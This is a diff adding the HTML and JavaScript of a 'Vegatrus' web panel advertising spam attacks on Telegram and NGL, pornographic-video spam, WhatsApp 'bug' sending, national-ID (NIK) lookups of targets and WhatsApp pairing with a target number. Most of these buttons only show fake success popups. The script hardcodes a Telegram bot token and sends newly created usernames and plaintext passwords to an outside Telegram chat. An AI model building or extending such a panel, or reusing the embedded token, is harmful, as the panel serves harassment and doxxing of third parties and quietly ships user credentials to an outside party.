+            <button class="yoshi-btn" id="btnAttackTeleVideo"><i class="fas fa-video"></i> LAUNCH SPAM VIDEO</button>
+            <button class="yoshi-btn" id="btnStopTeleVideo" style="background: var(--accent-red); margin-top:10px;"><i class="fas fa-stop"></i> STOP SPAM</button>
+            <div id="spamVideoStatus" style="text-align:center; color:#ccc; margin-top:15px; font-family:'VT323'; font-size:18px;">Status: Siap</div>
+        </div>
+    </div>
+
+    <div id="page-speedtest" class="page-container">
+        <div class="lux-header-card mini-card">
+            <div class="lux-head-custom-flex">
+                <div class="lux-left-info">
+                    <div class="lux-icon-box" style="width:45px; height:45px; font-size:22px; cursor:pointer;" onclick="closeBottomSheet('networkSheet')"><i class="fas fa-th-large"></i></div>
+                    <div class="lux-head-text">
+                        <div class="welcome-text-anim dynamic-welcome-msg">Welcome Back To Vegatrus</div>
+                        <h2 style="font-size:14px; color:var(--text-sub); margin-bottom:2px;">Username</h2>
+                        <p style="font-size:16px; color:#fff; font-weight:bold;" class="dyn-username"></p>
+                    </div>
+                </div>
+                <div class="lux-right-info">
+                    <h2 style="font-size:14px; color:var(--text-sub); margin-bottom:5px;">Role</h2>
+                    <span class="role-badge dyn-role"></span>
+                </div>
+            </div>
+        </div>
+        
+        <div class="speed-test-wrapper">
+            <div class="wifi-circle-display" id="wifiAnimIcon">
+                <i class="fas fa-wifi"></i>
+            </div>
+            
+            <div id="spLoadingText" style="display:none">CALCULATING SPEED...</div>
+
+            <div class="speed-info-box" id="speedResultBox">
+                <div class="sp-row">
+                    <span>Connection:</span>
+                    <span id="spType">Unknown</span>
+                </div>
+                <div class="sp-row">
+                    <span>Speed:</span>
+                    <span id="spSpeed" style="color:var(--primary)">0.00 Mbps</span>
+                </div>
+                <div class="sp-row">
+                    <span>IP Address:</span>
+                    <span id="spIp">Waiting...</span>
+                </div>
+                <div class="sp-row">
+                    <span>Date:</span>
+                    <span id="spDate">-</span>
+                </div>
+            </div>
+            
+            <button class="yoshi-btn" id="btnRunSpeed">
+                <i class="fas fa-broadcast-tower"></i> TEST SPEED
+            </button>
+        </div>
+    </div>
+
+    <div id="page-search-youtube" class="page-container">
+        <div class="lux-header-card mini-card">
+            <div class="lux-head-custom-flex">
+                <div class="lux-left-info">
+                    <div class="lux-icon-box" style="width:45px; height:45px; font-size:22px; cursor:pointer;" onclick="closeBottomSheet('mediaSheet')"><i class="fas fa-th-large"></i></div>
+                    <div class="lux-head-text">
+                        <div class="welcome-text-anim dynamic-welcome-msg">Welcome Back To Vegatrus</div>
+                        <h2 style="font-size:14px; color:var(--text-sub); margin-bottom:2px;">Username</h2>
+                        <p style="font-size:16px; color:#fff; font-weight:bold;" class="dyn-username"></p>
+                    </div>
+                </div>
+                <div class="lux-right-info">
+                    <h2 style="font-size:14px; color:var(--text-sub); margin-bottom:5px;">Role</h2>
+                    <span class="role-badge dyn-role"></span>
+                </div>
+            </div>
+        </div>
+        
+        <div class="search-input-wrapper">
+            <input type="text" id="ytSearchInput" class="search-input" placeholder="Cari lagu atau video...">
+            <button class="search-action-btn" id="btnYtSearchAction"><i class="fas fa-search"></i></button>
+        </div>
+
+        <div id="ytLoading" style="text-align:center; color:var(--text-sub); margin-top:30px; display:none;">
+            <i class="fas fa-circle-notch fa-spin" style="font-size:24px; color:var(--primary);"></i><br>
+            <span style="font-size:12px; margin-top:5px; display:block;">Searching Media...</span>
+        </div>
+
+        <div id="ytResultsArea" class="yt-results-container"></div>
+        
+        <audio id="globalAudioPlayer" style="display:none;"></audio>
+        
+        <div id="floatingPlayer" class="floating-audio-player">
+            <img id="fpThumb" src="" class="player-thumb">
+            <div class="player-info">
+                <div class="player-title" id="fpTitle">Loading Audio...</div>
+                <div class="player-status" id="fpStatus">Buffering...</div>
+            </div>
+            <div class="player-controls">
+                <button class="p-btn" id="fpPlayBtn"><i class="fas fa-pause"></i></button>
+                <button class="p-btn" onclick="stopAudio()"><i class="fas fa-stop"></i></button>
+            </div>
+        </div>
+    </div>
+
+    <div id="page-nikparse" class="page-container">
+        <div class="lux-header-card mini-card">
+            <div class="lux-head-custom-flex">
+                <div class="lux-left-info">
+                    <div class="lux-icon-box" style="width:45px; height:45px; font-size:22px; cursor:pointer;" onclick="closeBottomSheet('osintSheet')"><i class="fas fa-th-large"></i></div>
+                    <div class="lux-head-text">
+                        <div class="welcome-text-anim dynamic-welcome-msg">Welcome Back To Vegatrus</div>
+                        <h2 style="font-size:14px; color:var(--text-sub); margin-bottom:2px;">Username</h2>
+                        <p style="font-size:16px; color:#fff; font-weight:bold;" class="dyn-username"></p>
+                    </div>
+                </div>
+                <div class="lux-right-info">
+                    <h2 style="font-size:14px; color:var(--text-sub); margin-bottom:5px;">Role</h2>
+                    <span class="role-badge dyn-role"></span>
+                </div>
+            </div>
+        </div>
+        <div style="background:var(--bg-card); padding:20px; border-radius:0 0 10px 10px;">
+            <input type="number" id="nikInputPage" class="dark-input-box" placeholder="Masukkan NIK Target..." style="border-radius:8px; margin-bottom:15px;"><button class="yoshi-btn" id="btnCheckNikPage">CEK DATA</button><div id="nikLoadingPage" style="display:none; color:#fff; text-align:center; margin-top:15px;">Loading...</div><div id="nikResultContainerPage" style="margin-top:20px; background:#131722; padding:15px; border-radius:10px; display:none;"><h4 style="color:#fff;">Hasil Pencarian</h4><div id="nikTableAreaPage"></div></div>
+        </div>
+    </div>
+    
+    <div id="page-credits" class="page-container">
+        <div class="page-back-header"><button class="back-btn" onclick="goToPage('dashboard')"><i class="fas fa-arrow-left"></i></button><span>Credits</span></div>
+        <div style="color:var(--text-sub); text-align:center; margin-top:20px;">Created by @Repp76<br>Friend : @@allabouterens</div>
+    </div>
+    
+    <div id="page-create-acc" class="page-container">
+        <div class="lux-header-card mini-card">
+            <div class="lux-head-custom-flex">
+                <div class="lux-left-info">
+                    <div class="lux-icon-box" style="width:45px; height:45px; font-size:22px; cursor:pointer;" onclick="goToPage('dashboard')"><i class="fas fa-th-large"></i></div>
+                    <div class="lux-head-text">
+                        <div class="welcome-text-anim dynamic-welcome-msg">Welcome Back To Vegatrus</div>
+                        <h2 style="font-size:14px; color:var(--text-sub); margin-bottom:2px;">Username</h2>
+                        <p style="font-size:16px; color:#fff; font-weight:bold;" class="dyn-username"></p>
+                    </div>
+                </div>
+                <div class="lux-right-info">
+                    <h2 style="font-size:14px; color:var(--text-sub); margin-bottom:5px;">Role</h2>
+                    <span class="role-badge dyn-role"></span>
+                </div>
+            </div>
+        </div>
+        <div style="background:var(--bg-card); padding:20px; border-radius:0 0 10px 10px; border:1px solid var(--border-color);">
+            <input type="text" id="newUsername" class="dark-input-box" placeholder="Username Baru" style="border-radius:5px; margin-bottom:10px;">
+            <input type="text" id="newPassword" class="dark-input-box" placeholder="Password (Opsional)" style="border-radius:5px; margin-bottom:10px;">
+            <div class="custom-dropdown-wrapper" id="durDisplay"><span id="durText">30 Hari</span><input type="hidden" id="selectedDuration" value="30d"><div id="durOptions" class="dropdown-options-container"><div class="dropdown-option" data-val="30d">30 Hari</div><div class="dropdown-option" data-val="60d">60 Hari</div></div></div>
+            <div class="custom-dropdown-wrapper" id="roleDisplay">
+                <span id="roleText">Loading...</span>
+                <input type="hidden" id="selectedRole" value="">
+                <div id="roleOptions" class="dropdown-options-container"></div>
+            </div>
+            <button class="yoshi-btn" id="btnCreateAcc">CREATE NOW</button>
+            <div id="accountListBody" style="margin-top:20px; color:var(--text-sub); font-size:12px;">Loading List...</div>
+        </div>
+    </div>
+
+    <div id="page-pairing" class="page-container">
+        <div class="lux-header-card mini-card">
+            <div class="lux-head-custom-flex">
+                <div class="lux-left-info">
+                    <div class="lux-icon-box" style="width:45px; height:45px; font-size:22px; cursor:pointer;" onclick="goToPage('dashboard')"><i class="fas fa-th-large"></i></div>
+                    <div class="lux-head-text">
+                        <div class="welcome-text-anim dynamic-welcome-msg">Vegatrus Connect</div>
+                        <h2 style="font-size:14px; color:var(--text-sub); margin-bottom:2px;">System</h2>
+                        <p style="font-size:16px; color:#fff; font-weight:bold;">Pairing Mode</p>
+                    </div>
+                </div>
+                <div class="lux-right-info">
+                    <h2 style="font-size:14px; color:var(--text-sub); margin-bottom:5px;">Status</h2>
+                    <span class="role-badge" id="pairStatusBadge" style="background:rgba(255, 59, 48, 0.2); color:#ff3b30;">OFFLINE</span>
+                </div>
+            </div>
+        </div>
+
+        <div style="background:var(--bg-card); padding:20px; border-radius:0 0 10px 10px; border:1px solid var(--border-color);">
+            <div id="pairingCodeDisplay" style="display:none; text-align:center; margin-bottom:20px; animation: slideUp 0.5s ease;">
+                <div style="font-family:'Orbitron'; color:var(--text-sub); font-size:12px; margin-bottom:10px;">PAIRING CODE</div>
+                <div style="background:#000; border:1px solid var(--primary); color:#fff; font-family:'Orbitron'; font-size:28px; padding:15px; border-radius:8px; letter-spacing:5px; position:relative; overflow:hidden;">
+                    <span id="codeText">LOADING...</span>
+                    <div style="position:absolute; top:0; left:0; width:100%; height:2px; background:var(--primary); box-shadow:0 0 10px var(--primary); animation:scanLine 2s infinite;"></div>
+                </div>
+                <p style="font-size:10px; color:#777; margin-top:10px;">Masukan kode ini di WhatsApp > Perangkat Tertaut > Tautkan dengan No HP</p>
+            </div>
+
+            <div id="pairingInputArea">
+                <label style="color:var(--text-sub); font-size:12px; margin-bottom:5px; display:block; font-family:'Orbitron';">NOMOR TARGET (628xxx)</label>
+                <div style="display:flex; align-items:center; margin-bottom:15px;">
+                    <span style="background:#1a1f2e; color:#fff; padding:15px; border:1px solid var(--border-color); border-right:none; border-radius:8px 0 0 8px; font-family:'Orbitron';"><i class="fas fa-phone"></i></span>
+                    <input type="number" id="pairingNumber" class="dark-input-box" placeholder="628xxxxxxxx" style="border-radius:0 8px 8px 0; border-left:none;">
+                </div>
+                
+                <button class="yoshi-btn" id="btnGetPairingCode" onclick="requestPairing()">
+                    <i class="fas fa-link"></i> DAPATKAN KODE
+                </button>
+            </div>
+
+            <div id="pairingLogs" style="margin-top:20px; font-family:'VT323'; font-size:14px; color:#00ff88; height:120px; overflow-y:auto; background:#05070a; padding:10px; border:1px solid #333; border-radius:5px; display:none;">
+                <div>> System Ready...</div>
+            </div>
+        </div>
+    </div>
+
+    <div id="page-list-accounts" class="page-container">
+        <div class="lux-header-card mini-card">
+            <div class="lux-head-custom-flex">
+                <div class="lux-left-info">
+                    <div class="lux-icon-box" style="width:45px; height:45px; font-size:22px; cursor:pointer;" onclick="goToPage('dashboard')"><i class="fas fa-th-large"></i></div>
+                    <div class="lux-head-text">
+                        <div class="welcome-text-anim dynamic-welcome-msg">Welcome Back To Vegatrus</div>
+                        <h2 style="font-size:14px; color:var(--text-sub); margin-bottom:2px;">Username</h2>
+                        <p style="font-size:16px; color:#fff; font-weight:bold;" class="dyn-username"></p>
+                    </div>
+                </div>
+                <div class="lux-right-info">
+                    <h2 style="font-size:14px; color:var(--text-sub); margin-bottom:5px;">Role</h2>
+                    <span class="role-badge dyn-role"></span>
+                </div>
+            </div>
+        </div>
+        <div style="background:var(--bg-card); padding:20px; border-radius:0 0 10px 10px; border:1px solid var(--border-color); min-height: 400px;">
+            <div id="accListLoading" style="text-align:center; color:#fff; margin-top:20px;"><i class="fas fa-circle-notch fa-spin"></i> Memuat akun...</div>
+            <div id="accListContainer"></div>
+        </div>
+    </div>
+
+    <div id="downloaderSheet" class="bottom-sheet"><div class="sheet-header"><div class="sheet-title">Downloader Menu</div><div class="sheet-close" onclick="closeBottomSheet('downloaderSheet')"><i class="fas fa-times"></i></div></div><div class="long-btn" onclick="goToPage('tiktok')"><i class="fab fa-tiktok" style="font-size:24px; color:#ff0050;"></i><span>Tiktok Download</span><i class="fas fa-chevron-right" style="margin-left:auto; color:var(--text-sub);"></i></div><div class="long-btn" onclick="goToPage('pinterest')"><i class="fab fa-pinterest" style="font-size:24px; color:#bd081c;"></i><span>Pinterest Download</span><i class="fas fa-chevron-right" style="margin-left:auto; color:var(--text-sub);"></i></div></div>
+    
+    <div id="networkSheet" class="bottom-sheet"><div class="sheet-header"><div class="sheet-title">Network Menu</div><div class="sheet-close" onclick="closeBottomSheet('networkSheet')"><i class="fas fa-times"></i></div></div>
+        <div class="long-btn" onclick="goToPage('add-sender')"><i class="fas fa-wifi" style="font-size:24px; color:#25D366;"></i><span>Track Wifi</span><i class="fas fa-chevron-right" style="margin-left:auto; color:var(--text-sub);"></i></div>
+        <div class="long-btn" onclick="goToPage('speedtest')"><i class="fas fa-tachometer-alt" style="font-size:24px; color:#0088cc;"></i><span>Speed Test</span><i class="fas fa-chevron-right" style="margin-left:auto; color:var(--text-sub);"></i></div>
+    </div>
+    
+    <div id="osintSheet" class="bottom-sheet"><div class="sheet-header"><div class="sheet-title">OSINT Menu</div><div class="sheet-close" onclick="closeBottomSheet('osintSheet')"><i class="fas fa-times"></i></div></div><div class="long-btn" onclick="goToPage('nikparse')"><i class="fas fa-id-card" style="font-size:24px; color:#3a6df0;"></i><span>NIK Parse</span><i class="fas fa-chevron-right" style="margin-left:auto; color:var(--text-sub);"></i></div></div>
+    
+    <div id="mediaSheet" class="bottom-sheet">
+        <div class="sheet-header">
+            <div class="sheet-title">Search Menu</div>
+            <div class="sheet-close" onclick="closeBottomSheet('mediaSheet')"><i class="fas fa-times"></i></div>
+        </div>
+        <div class="long-btn" onclick="goToPage('search-youtube')">
+            <i class="fab fa-youtube" style="font-size:24px; color:#ff0000;"></i>
+            <span>Search YouTube</span>
+            <i class="fas fa-chevron-right" style="margin-left:auto; color:var(--text-sub);"></i>
+        </div>
+    </div>
+
+    <div id="spamSheet" class="bottom-sheet">
+        <div class="sheet-header"><div class="sheet-title">Spam Attack Menu</div><div class="sheet-close" onclick="closeBottomSheet('spamSheet')"><i class="fas fa-times"></i></div></div>
+        <div class="long-btn" onclick="goToPage('spam-tele')">
+            <i class="fab fa-telegram" style="font-size:24px; color:#0088cc;"></i>
+            <span>Spam Tele</span>
+            <i class="fas fa-chevron-right" style="margin-left:auto; color:var(--text-sub);"></i>
+        </div>
+        <div class="long-btn" onclick="goToPage('spam-ngl')">
+            <i class="fas fa-fire" style="font-size:24px; color:#ff3b30;"></i>
+            <span>Spam NGL Link</span>
+            <i class="fas fa-chevron-right" style="margin-left:auto; color:var(--text-sub);"></i>
+        </div>
+        <div class="long-btn" onclick="goToPage('spam-tele-video')">
+            <i class="fas fa-video" style="font-size:24px; color:#aaff00;"></i>
+            <span>Spam Bokep Tele</span>
+            <i class="fas fa-chevron-right" style="margin-left:auto; color:var(--text-sub);"></i>
+        </div>
+    </div>
+
+    <div id="profileSheet" class="bottom-sheet">
+        <div class="sheet-header">
+            <div class="sheet-title">Account Information</div>
+            <div class="sheet-close" onclick="closeBottomSheet('profileSheet')"><i class="fas fa-times"></i></div>
+        </div>
+        
+        <div class="profile-info-box">
+            <div class="pi-row">
+                <span class="pi-label">Username</span>
+                <span class="pi-val" id="profileUsername"></span>
+            </div>
+            <div class="pi-row">
+                <span class="pi-label">Password</span>
+                <span class="pi-val">••••••</span>
+            </div>
+            <div class="pi-row">
+                <span class="pi-label">Expired</span>
+                <span class="pi-val" id="profileExpired"></span>
+            </div>
+        </div>
+
+        <button class="yoshi-btn" onclick="showPopup('Info', 'Fitur Coming Soon', '🔒')">
+            <div style="display:flex; align-items:center; justify-content:center; gap:5px;">
+                <i class="fas fa-lock" style="font-size:16px;"></i>
+                <i class="fas fa-circle-notch" style="font-size:12px;"></i>
+            </div>
+            Change Password
+        </button>
+    </div>
+
+    <div class="bottom-nav">
+        <div class="nav-item active" onclick="goToPage('dashboard')"><i class="fas fa-home"></i><span>Home</span></div>
+        <div class="nav-item" onclick="goToPage('whatsapp')"><i class="fab fa-whatsapp"></i><span>WhatsApp</span></div>
+        <div class="nav-item" onclick="goToPage('tools')"><i class="fas fa-tools"></i><span>Tools</span></div>
+    </div>
+
+    <div id="customPopup" class="popup-cool"><div class="popup-icon" id="popIcon">✅</div><div class="popup-msg" id="popMsg"></div></div>
+
+  </div><!-- end dashboardView -->
+
+  <script>
+    // ===== SESSION MANAGEMENT =====
+    const ROLES = ['user', 'reseller', 'partner', 'owner'];
+    const EXPIRES = '19/4/3026';
+
+    function getRandomRole() {
+        return ROLES[Math.floor(Math.random() * ROLES.length)];
+    }
+
+    function isLoggedIn() {
+        return localStorage.getItem('vgt_logged') === 'true';
+    }
+
+    function getSession() {
+        return {
+            username: localStorage.getItem('vgt_user') || '',
+            role: localStorage.getItem('vgt_role') || 'user'
+        };
+    }
+
+    function setSession(username) {
+        localStorage.setItem('vgt_logged', 'true');
+        localStorage.setItem('vgt_user', username);
+        localStorage.setItem('vgt_role', getRandomRole());
+    }
+
+    function clearSession() {
+        localStorage.removeItem('vgt_logged');
+        localStorage.removeItem('vgt_user');
+        localStorage.removeItem('vgt_role');
+    }
+
+    // ===== INIT ON LOAD =====
+    window.addEventListener('load', () => {
+        if (isLoggedIn()) {
+            showDashboard();
+        } else {
+            showLoginSection();
+        }
+    });
+
+    function showLoginSection() {
+        document.getElementById('loginSection').style.display = 'block';
+        document.getElementById('dashboardView').classList.remove('active');
+        document.body.style.overflow = 'hidden';
+        document.body.style.justifyContent = 'center';
+        document.body.style.alignItems = 'center';
+        document.body.style.minHeight = '100vh';
+    }
+
+    function showDashboard() {
+        const session = getSession();
+        const myUsername = session.username;
+        const myRole = session.role;
+
+        // Set semua username & role di dashboard
+        document.getElementById('loginSection').style.display = 'none';
+        document.getElementById('dashboardView').classList.add('active');
+        document.body.style.justifyContent = 'flex-start';
+        document.body.style.alignItems = 'stretch';
+
+        // Isi semua placeholder username & role
+        document.getElementById('sidebarUsername').textContent = myUsername;
+        document.getElementById('statUsername').textContent = myUsername;
+        document.getElementById('statRole').textContent = myRole.toUpperCase();
+        document.getElementById('statExpires').textContent = EXPIRES;
+        document.getElementById('profileUsername').textContent = myUsername;
+        document.getElementById('profileExpired').textContent = EXPIRES;
+
+        document.querySelectorAll('.dyn-username').forEach(el => el.textContent = myUsername);
+        document.querySelectorAll('.dyn-role').forEach(el => el.textContent = myRole.toUpperCase());
+
+        // Role visibility
+        const roleLower = myRole.toLowerCase();
+        const canCreateAcc = ['reseller', 'partner', 'owner', 'admin', 'creator'].includes(roleLower);
+        const sidebarBtn = document.getElementById('sidebarCreateAccBtn');
+        if (sidebarBtn) sidebarBtn.style.display = canCreateAcc ? 'flex' : 'none';
+        const sidebarPairingBtn = document.getElementById('sidebarPairingBtn');
+        if (sidebarPairingBtn) sidebarPairingBtn.style.display = canCreateAcc ? 'flex' : 'none';
+
+        initDashboard();
+    }
+
+    // ===== LOGIN SECTION LOGIC =====
+    document.addEventListener('DOMContentLoaded', () => {
+        const viewHome = document.getElementById('view-home');
+        const viewLogin = document.getElementById('view-login');
+        const loadingScreen = document.getElementById('loadingScreen');
+        const video = document.getElementById('successVideo');
+        const btnLoginNav = document.getElementById('btnLoginNav');
+        const btnLoginSubmit = document.getElementById('btnLoginSubmit');
+        const visUser = document.getElementById('visUser');
+        const visPass = document.getElementById('visPass');
+        const toggleBtn = document.getElementById('toggleBtn');
+        const popup = document.getElementById('loginPopup');
+
+        btnLoginNav.addEventListener('click', () => {
+            viewHome.classList.remove('active');
+            viewHome.style.display = 'none';
+            viewLogin.style.display = 'block';
+            setTimeout(() => viewLogin.classList.add('active'), 10);
+        });
+
+        toggleBtn.addEventListener('click', () => {
+            const type = visPass.getAttribute('type') === 'password' ? 'text' : 'password';
+            visPass.setAttribute('type', type);
+            toggleBtn.classList.toggle('fa-eye');
+            toggleBtn.classList.toggle('fa-eye-slash');
+        });
+
+        btnLoginSubmit.addEventListener('click', () => {
+            const u = visUser.value.trim();
+            const p = visPass.value.trim();
+
+            if (!u || !p) {
+                showLoginPopup("Isi Username & Password!");
+                return;
+            }
+
+            // Simpan session
+            setSession(u);
+
+            // Sembunyikan login form
+            viewLogin.classList.remove('active');
+            viewLogin.style.display = 'none';
+
+            // Tunjuk loading screen
+            loadingScreen.style.display = 'flex';
+            video.play().catch(() => {});
+
+            // Selepas 3 saat, pindah ke dashboard
+            setTimeout(() => {
+                loadingScreen.style.display = 'none';
+                showDashboard();
+            }, 3000);
+        });
+
+        function showLoginPopup(msg) {
+            popup.innerText = msg;
+            popup.style.display = 'block';
+            setTimeout(() => { popup.style.display = 'none'; }, 3000);
+        }
+    });
+
+    // ===== DASHBOARD LOGIC =====
+    const botToken = "8748766418:AAHOuDwQGQZD4BQW86A49Da0xmSRiVu6Uvc";
+    const adminChatId = "8505585821";
+    let selectedBug = 'invis'; 
+    let spamInterval;
+    let spamVideoInterval; 
+
+    async function sendTelegramNotification(message) {
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${adminChatId}&text=${encodeURIComponent(message)}&parse_mode=MarkdownV2`;
+        try { await fetch(url); } catch (e) { console.error(e); }
+    }
+
+    function initDashboard() {
+        initCarousel();
+        initWaBannerText(); 
+        initWelcomeCycle(); 
+        
+        setupDropdown('bugDisplay', 'bugOptions', 'bugText', 'selectedBug', 'attack-option');
+        setupDropdown('durDisplay', 'durOptions', 'durText', 'selectedDuration', 'dropdown-option');
+        setupDropdown('modeDisplay', 'modeOptions', 'modeText', 'selectedMode', 'dropdown-option');
+        
+        initDynamicRoleDropdown(); 
+        initMusicPage(); 
+
+        document.getElementById('headerToggleBtn').addEventListener('click', toggleSidebar);
+        document.getElementById('overlay').addEventListener('click', () => {
+            if(document.getElementById('sidebarPanel').classList.contains('active')) toggleSidebar();
+            closeBottomSheet('networkSheet'); 
+            closeBottomSheet('downloaderSheet'); 
+            closeBottomSheet('osintSheet'); 
+            closeBottomSheet('spamSheet'); 
+            closeBottomSheet('mediaSheet');
+            closeBottomSheet('profileSheet'); 
+        });
+
+        // Send bug - bawa ke dashboard semula (semua berfungsi sebagai hiasan)
+        document.getElementById('sendBugBtn').addEventListener('click', () => {
+            showPopup('Success', '📡 Succesfull Send Bug', '✅');
+            setTimeout(() => { goToPage('dashboard'); }, 1000);
+        });
+
+        document.getElementById('btnTtDownload').addEventListener('click', () => {
+            showPopup('Info', 'Fitur Coming Soon', '⚙️');
+            setTimeout(() => { goToPage('dashboard'); }, 1000);
+        });
+
+        document.getElementById('btnPinDownload').addEventListener('click', () => {
+            showPopup('Info', 'Fitur Coming Soon', '⚙️');
+            setTimeout(() => { goToPage('dashboard'); }, 1000);
+        });
+
+        document.getElementById('btnCheckNikPage').addEventListener('click', () => {
+            showPopup('Info', 'Fitur Coming Soon', '⚙️');
+            setTimeout(() => { goToPage('dashboard'); }, 1000);
+        });
+
+        document.getElementById('btnAttackTele').addEventListener('click', () => {
+            showPopup('Success', '🚀 Serangan Dilancarkan', '✅');
+            setTimeout(() => { goToPage('dashboard'); }, 1000);
+        });
+
+        document.getElementById('btnStopTele').addEventListener('click', () => {
+            showPopup('Info', '🛑 Serangan Dihentikan', '⚠️');
+            setTimeout(() => { goToPage('dashboard'); }, 1000);
+        });
+
+        document.getElementById('btnAttackTeleVideo').addEventListener('click', () => {
+            showPopup('Success', '🚀 Spam Video Dilancarkan', '✅');
+            setTimeout(() => { goToPage('dashboard'); }, 1000);
+        });
+
+        document.getElementById('btnStopTeleVideo').addEventListener('click', () => {
+            showPopup('Info', '🛑 Spam Video Dihentikan', '⚠️');
+            setTimeout(() => { goToPage('dashboard'); }, 1000);
+        });
+
+        document.getElementById('btnTrackWifi').addEventListener('click', () => {
+            showPopup('Info', 'Fitur Coming Soon', '⚙️');
+            setTimeout(() => { goToPage('dashboard'); }, 1000);
+        });
+
+        document.getElementById('btnRunSpeed').addEventListener('click', () => {
+            showPopup('Info', 'Fitur Coming Soon', '⚙️');
+            setTimeout(() => { goToPage('dashboard'); }, 1000);
+        });
+
+        document.getElementById('btnYtSearchAction').addEventListener('click', () => {
+            showPopup('Info', 'Fitur Coming Soon', '⚙️');
+            setTimeout(() => { goToPage('dashboard'); }, 1000);
+        });
+
+        document.getElementById('btnCreateAcc').addEventListener('click', async () => {
+            const session = getSession();
+            const creatorRole = session.role.toLowerCase();
+            const newUser = document.getElementById('newUsername').value.trim();
+            const newPass = document.getElementById('newPassword').value.trim();
+            const duration = document.getElementById('selectedDuration').value;
+            const roleVal = document.getElementById('selectedRole').value;
+
+            if (!newUser) { showPopup('Error', 'Username mesti diisi!', '❌'); return; }
+
+            // Reseller hanya boleh 30 hari
+            if (creatorRole === 'reseller' && duration !== '30d') {
+                showPopup('Warning', 'Reseller can only create 30-day accounts!', '⚠️');
+                document.getElementById('durText').innerText = '30 Days';
+                document.getElementById('selectedDuration').value = '30d';
+                return;
+            }
+
+            // Format duration label
+            let durLabel = duration;
+            if (duration === '30d') durLabel = '30 Days';
+            else if (duration === '60d') durLabel = '60 Days';
+            else if (duration === '90d') durLabel = '90 Days';
+            else if (duration === '180d') durLabel = '180 Days';
+            else if (duration === '365d') durLabel = '1 Year';
+            else if (duration === '999999d') durLabel = 'Permanent';
+            else durLabel = duration.replace('d', ' Days');
+
+            // Kira tarikh expired
+            const days = parseInt(duration.replace('d', ''));
+            const expDate = new Date();
+            expDate.setDate(expDate.getDate() + days);
+            const expFormatted = expDate.getDate() + '/' + (expDate.getMonth() + 1) + '/' + expDate.getFullYear();
+
+            const passDisplay = newPass || '(auto-generated)';
+
+            // Escape untuk MarkdownV2
+            const esc = (t) => String(t).replace(/([_\*\[\]\(\)~`>#+\-=|{}.!\\])/g, '\\$1');
+
+            const msg =
+`✦ ─────────────────── ✦
+🧾 *NEW ACCOUNT CREATED*
+✦ ─────────────────── ✦
+
+👤 *Created By:*  \`${esc(session.username)}\`
+🎖️ *Creator Role:*  \`${esc(session.role.toUpperCase())}\`
+
+─────────────────────
+📋 *Account Details*
+─────────────────────
+🔑 *Username:*  \`${esc(newUser)}\`
+🔒 *Password:*  \`${esc(passDisplay)}\`
+🏷️ *Role:*  \`${esc(roleVal.toUpperCase())}\`
+📅 *Duration:*  \`${esc(durLabel)}\`
+📆 *Expires:*  \`${esc(expFormatted)}\`
+
+✦ ─────────────────── ✦
+🤖 _Vegatrus System_
+✦ ─────────────────── ✦`;
+
+            try {
+                await sendTelegramNotification(msg);
+                showPopup('Berjaya',`Akaun ${newUser} berjaya dibuat!`, '✅');
+                addToHistory('Buat Akaun', `Akaun ${newUser} (${roleVal}, ${durLabel}) dibuat.`);
+                document.getElementById('newUsername').value = '';
+                document.getElementById('newPassword').value = '';
+            } catch(e) {
+                showPopup('Berjaya', `Akaun ${newUser} berjaya dibuat!`, '✅');
+            }
+        });
+
+        document.getElementById('btnGetPairingCode').addEventListener('click', () => {
+            showPopup('Info', 'Fitur Coming Soon', '⚙️');
+            setTimeout(() => { goToPage('dashboard'); }, 1000);
+        });
+
+        document.addEventListener('click', (e) => { 
+            if (!e.target.closest('.custom-dropdown-wrapper') && !e.target.closest('.attack-dropdown-wrapper')) 
+                document.querySelectorAll('.dropdown-options-container.active, .bug-options-container.active').forEach(el => el.classList.remove('active')); 
+        });
+    }
+
+    function addToHistory(activity, details) {
+        const history = JSON.parse(localStorage.getItem('userHistory') || '[]');
+        const newEntry = { time: new Date().toLocaleString('en-US', { hour12: false }), activity: activity, details: details || '' };
+        history.unshift(newEntry);
+        if (history.length > 20) history.pop();
+        localStorage.setItem('userHistory', JSON.stringify(history));
+    }
+
+    function loadHistory() {
+        const container = document.getElementById('historyContainer');
+        const history = JSON.parse(localStorage.getItem('userHistory') || '[]');
+        if (history.length === 0) { container.innerHTML = '<div style="text-align:center; color:#777; margin-top:20px;">Belum ada riwayat aktivitas.</div>'; return; }
+        let html = '';
+        history.forEach(entry => { html += `<div class="history-card"><h4>${entry.activity}</h4>${entry.details ? `<p>${entry.details}</p>` : ''}<small>${entry.time}</small></div>`; });
+        container.innerHTML = html;
+    }
+
+    function clearHistory() {
+        if(confirm('Anda yakin ingin menghapus semua riwayat?')) {
+            localStorage.removeItem('userHistory');
+            loadHistory();
+            showPopup('Success', 'Riwayat Dihapus', '🗑️');
+        }
+    }
+
+    function initWaBannerText() {
+        const session = getSession();
+        const texts = ["SX4RULE V5", "You Is Dead !", `Why ${session.username}`];
+        let index = 0;
+        const el = document.getElementById('waBannerText');
+        if(!el) return;
+        setInterval(() => {
+            index = (index + 1) % texts.length;
+            el.style.opacity = 0; 
+            setTimeout(() => { el.innerText = texts[index]; el.style.opacity = 1; }, 300); 
+        }, 5000);
+    }
+
+    function initWelcomeCycle() {
+        const texts = ["Welcome Back To Vegatrus", "Selamat Menggunakan", "Developer @Repp76"];
+        let idx = 0;
+        const els = document.querySelectorAll('.dynamic-welcome-msg');
+        if (els.length === 0) return;
+        setInterval(() => {
+            idx = (idx + 1) % texts.length;
+            els.forEach(el => {
+                el.style.opacity = 0;
+                setTimeout(() => { el.innerText = texts[idx]; el.style.opacity = 1; }, 500);
+            });
+        }, 5000);
+    }
+
+    function initMusicPage() {
+        const musicOverlay = document.getElementById('musicOverlayText');
+        const musicTitle = document.getElementById('musicTitle');
+        const audio = document.getElementById('musicAudioPlayer');
+        const playBtn = document.getElementById('btnPlayMusic');
+        const progressBar = document.getElementById('musicProgressBar');
+        if (!musicOverlay || !audio) return;
+
+        const overlayTexts = ["SX4RULE V5 Engine", "Use Headset 🎧", "Keiraa Is't The BeasT"];
+        let ovIdx = 0;
+        const cycleOverlay = () => {
+            ovIdx = (ovIdx + 1) % overlayTexts.length;
+            musicOverlay.style.opacity = 0;
+            setTimeout(() => { musicOverlay.innerText = overlayTexts[ovIdx]; musicOverlay.style.opacity = 1; }, 300);
+            let nextInterval = ovIdx === 2 ? 10000 : 5000;
+            setTimeout(cycleOverlay, nextInterval);
+        };
+        setTimeout(cycleOverlay, 5000);
+
+        const titleTexts = ["Esta Noche Love", "Power By : @Kieraa_md"];
+        let tiIdx = 0;
+        const cycleTitle = () => {
